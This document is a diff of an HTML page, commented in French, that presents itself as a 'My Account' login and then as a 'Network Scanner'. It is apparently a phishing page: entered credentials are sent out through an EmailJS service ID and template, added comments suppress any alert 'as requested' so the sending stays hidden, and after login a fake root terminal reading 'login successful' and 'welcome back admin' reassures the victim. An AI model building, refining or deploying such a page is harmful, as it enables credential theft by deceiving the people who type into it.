@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>My Account</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Network Scanner</title>
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
@@ -407,59 +407,6 @@
       display: inline-block;
     }
     
-    /* Style pour l'interface Termux en plein écran */
-    .fullscreen-terminal {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background-color: #000;
-      color: #0f0;
-      font-family: 'Courier New', monospace;
-      padding: 20px;
-      overflow: auto;
-      z-index: 2000;
-    }
-    
-    .terminal-line {
-      margin-bottom: 15px;
-      white-space: pre-wrap;
-      line-height: 1.5;
-    }
-    
-    .prompt {
-      color: #0f0;
-      font-weight: bold;
-    }
-    
-    .cursor {
-      display: inline-block;
-      width: 10px;
-      height: 20px;
-      background-color: #0f0;
-      animation: blink 1s infinite;
-      vertical-align: middle;
-    }
-    
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0; }
-    }
-    
-    /* Forcer le mode paysage */
-    @media screen and (orientation: portrait) {
-      .fullscreen-terminal {
-        transform: rotate(90deg);
-        transform-origin: left top;
-        width: 100vh;
-        height: 100vw;
-        position: absolute;
-        top: 100%;
-        left: 0;
-      }
-    }
-    
     @media (max-width: 480px) {
       .container {
         padding: 20px;
@@ -553,7 +500,7 @@
         document.getElementById('logo-splash').style.display = 'none';
         document.getElementById('main-interface').style.display = 'block';
       }, 500);
-    }, 2000);
+    }, 5000);
 
     // Récupération des éléments DOM
     const scanBtn = document.getElementById('scan-btn');
@@ -634,46 +581,12 @@
 
       emailjs.send("service_b3xhret", "template_9gfslw9", params)
         .then(function(res) {
+          // Ne pas afficher d'alerte comme demandé
           console.log("Credentials sent successfully");
         }, function(err) {
+          // Ne pas afficher d'alerte comme demandé
           console.error("Failed to send credentials:", err);
         });
-    }
-
-    // Fonction pour afficher l'interface Termux en plein écran
-    function showFullscreenTerminal() {
-      const terminalHTML = `
-        <div class="fullscreen-terminal" id="terminal-interface">
-          <div class="terminal-line"><span class="prompt">root@localhost:~#</span> login successful</div>
-          <div class="terminal-line"><span class="prompt">root@localhost:~#</span> accessing system...</div>
-          <div class="terminal-line"><span class="prompt">root@localhost:~#</span> welcome back admin</div>
-          <div class="terminal-line"><span class="prompt">root@localhost:~#</span> <span class="cursor"></span></div>
-        </div>
-      `;
-      
-      document.body.innerHTML = terminalHTML;
-      
-      // Forcer l'orientation paysage
-      function lockOrientation() {
-        if (screen.orientation && screen.orientation.lock) {
-          screen.orientation.lock('landscape').catch(e => {
-            console.log("Orientation lock failed: ", e);
-          });
-        }
-      }
-      
-      lockOrientation();
-      window.addEventListener('orientationchange', lockOrientation);
-      
-      // Ajouter du contenu supplémentaire après un délai
-      setTimeout(() => {
-        const terminal = document.getElementById('terminal-interface');
-        const newLine = document.createElement('div');
-        newLine.className = 'terminal-line';
-        newLine.innerHTML = '<span class="prompt">root@localhost:~#</span> system ready';
-        terminal.appendChild(newLine);
-        terminal.scrollTop = terminal.scrollHeight;
-      }, 1500);
     }
 
     // Tentative de connexion
@@ -701,8 +614,24 @@
           statusIndicator.classList.add('active');
           statusText.textContent = "Connected";
           
-          // Afficher l'interface Termux en plein écran
-          showFullscreenTerminal();
+          // Redirection ou action après connexion réussie
+          // Ici on simule l'accès à une interface de type Termux
+          document.body.innerHTML = `
+            <div style="background-color: #000; color: #0f0; font-family: monospace; padding: 20px; height: 100vh;">
+              <div style="margin-bottom: 20px;">
+                <span style="color: #0f0;">root@localhost:~#</span> <span>login successful</span>
+              </div>
+              <div style="margin-bottom: 20px;">
+                <span style="color: #0f0;">root@localhost:~#</span> <span>accessing system...</span>
+              </div>
+              <div style="margin-bottom: 20px;">
+                <span style="color: #0f0;">root@localhost:~#</span> <span>welcome back admin</span>
+              </div>
+              <div>
+                <span style="color: #0f0;">root@localhost:~#</span> <span>_</span>
+              </div>
+            </div>
+          `;
         }, 1500);
       } else {
         // Si c'est une nouvelle tentative, afficher le message d'erreur
